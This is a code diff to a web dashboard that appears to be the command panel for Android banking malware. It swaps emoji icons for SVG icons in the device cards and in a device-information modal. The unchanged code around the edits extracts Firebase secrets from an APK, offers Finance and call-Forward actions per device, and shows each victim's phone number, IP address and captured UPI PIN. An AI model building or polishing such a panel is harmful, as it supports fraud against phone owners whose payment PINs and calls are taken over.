@@ -1099,8 +1099,8 @@
       }
       lastExtracted = found;
       const bit = [];
-      if (found.firebaseUrl) bit.push("URL ✓");
-      if (found.secret) bit.push("Key ✓");
+      if (found.firebaseUrl) bit.push("URL ok");
+      if (found.secret) bit.push("Key ok");
       if (found.projectId) bit.push("Project: " + found.projectId);
       setApkStatus("Extract OK — " + bit.join(" · "));
       // auto-fill form
@@ -1256,6 +1256,18 @@
     return list;
   }
 
+  function ico(name) {
+    const paths = {
+      star: '<path d="M12 2l3 7h7l-5.5 4.5L18 21l-6-4-6 4 1.5-7.5L2 9h7z"/>',
+      gear: '<circle cx="12" cy="12" r="3"/><path d="M12 2v2m0 16v2M4.9 4.9l1.4 1.4m11.4 11.4 1.4 1.4M2 12h2m16 0h2M4.9 19.1l1.4-1.4m11.4-11.4 1.4-1.4"/>',
+      clock: '<circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/>',
+      phone: '<path d="M22 16.9v3a2 2 0 0 1-2.2 2 19.8 19.8 0 0 1-8.6-3.1 19.5 19.5 0 0 1-6-6A19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7c.1.9.4 1.8.7 2.6a2 2 0 0 1-.5 2.1L8.1 9.9a16 16 0 0 0 6 6l1.5-1.2a2 2 0 0 1 2.1-.4c.9.3 1.7.5 2.6.7A2 2 0 0 1 22 16.9z"/>',
+      money: '<path d="M12 1v22M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/>',
+      trash: '<path d="M3 6h18M8 6V4h8v2m-1 0v14a2 2 0 0 1-2 2H9a2 2 0 0 1-2-2V6"/>',
+    };
+    return `<span class="ico" aria-hidden="true"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">${paths[name] || ""}</svg></span>`;
+  }
+
   function deviceCardHtml(d) {
     return `
       <div class="device-card" data-id="${esc(d.id)}">
@@ -1270,12 +1282,12 @@
         <div class="date">${esc(d.lastSeenFmt !== "—" ? d.lastSeenFmt : "—")}</div>
         <div class="notes">${d.notes ? esc(d.notes) : "No Notes"}</div>
         <div class="card-actions">
-          <button class="icon-btn star ${isFav(d.id) ? "on" : ""}" title="Favorite" data-star="${esc(d.id)}">★</button>
-          <button class="icon-btn" title="System Settings" data-settings="${esc(d.id)}">⚙</button>
-          <button class="icon-btn" title="Last Seen" data-lastseen="${esc(d.id)}">🕐</button>
-          <button class="icon-btn finance" title="Finance" data-finance="${esc(d.id)}">$</button>
-          <button class="icon-btn" title="Forward" data-forward="${esc(d.id)}">📞</button>
-          <button class="icon-btn danger" title="Delete" data-del="${esc(d.id)}">🗑</button>
+          <button class="icon-btn star ${isFav(d.id) ? "on" : ""}" title="Favorite" data-star="${esc(d.id)}">${ico("star")}</button>
+          <button class="icon-btn" title="System Settings" data-settings="${esc(d.id)}">${ico("gear")}</button>
+          <button class="icon-btn" title="Last Seen" data-lastseen="${esc(d.id)}">${ico("clock")}</button>
+          <button class="icon-btn finance" title="Finance" data-finance="${esc(d.id)}">${ico("money")}</button>
+          <button class="icon-btn" title="Forward" data-forward="${esc(d.id)}">${ico("phone")}</button>
+          <button class="icon-btn danger" title="Delete" data-del="${esc(d.id)}">${ico("trash")}</button>
         </div>
       </div>
     `;
@@ -1940,16 +1952,16 @@
     if (!d) return;
     $("modalSettingsBody").innerHTML = `
       <div class="info-list">
-        <div class="info-row"><span class="info-lbl">📱 Device ID</span><span class="info-val">${esc(d.id)}</span></div>
-        <div class="info-row"><span class="info-lbl">📱 Model</span><span class="info-val">${esc(d.name)}</span></div>
-        <div class="info-row"><span class="info-lbl">🔋 Battery</span><span class="info-val">${esc(d.batteryDisplay)}</span></div>
-        <div class="info-row"><span class="info-lbl">🤖 Android</span><span class="info-val">${esc(d.android)}</span></div>
-        <div class="info-row"><span class="info-lbl">⚙ SDK</span><span class="info-val">${esc(d.sdk)}</span></div>
-        <div class="info-row"><span class="info-lbl">📞 Phone</span><span class="info-val">${esc(d.phone)}</span></div>
-        <div class="info-row"><span class="info-lbl">💳 UPI Pin</span><span class="info-val">${esc(d.upipin || "N/A")}</span></div>
-        <div class="info-row"><span class="info-lbl">📅 Date</span><span class="info-val">${esc(d.lastSeenFmt)}</span></div>
-        <div class="info-row"><span class="info-lbl">🌐 IP</span><span class="info-val">${esc(d.ip)}</span></div>
-        <div class="info-row"><span class="info-lbl">💾 Storage</span><span class="info-val">${esc(d.storage)}</span></div>
+        <div class="info-row"><span class="info-lbl">Device ID</span><span class="info-val">${esc(d.id)}</span></div>
+        <div class="info-row"><span class="info-lbl">Model</span><span class="info-val">${esc(d.name)}</span></div>
+        <div class="info-row"><span class="info-lbl">Battery</span><span class="info-val">${esc(d.batteryDisplay)}</span></div>
+        <div class="info-row"><span class="info-lbl">Android</span><span class="info-val">${esc(d.android)}</span></div>
+        <div class="info-row"><span class="info-lbl">SDK</span><span class="info-val">${esc(d.sdk)}</span></div>
+        <div class="info-row"><span class="info-lbl">Phone</span><span class="info-val">${esc(d.phone)}</span></div>
+        <div class="info-row"><span class="info-lbl">UPI Pin</span><span class="info-val">${esc(d.upipin || "N/A")}</span></div>
+        <div class="info-row"><span class="info-lbl">Date</span><span class="info-val">${esc(d.lastSeenFmt)}</span></div>
+        <div class="info-row"><span class="info-lbl">IP</span><span class="info-val">${esc(d.ip)}</span></div>
+        <div class="info-row"><span class="info-lbl">Storage</span><span class="info-val">${esc(d.storage)}</span></div>
       </div>`;
     show("modalSettings", true);
   }
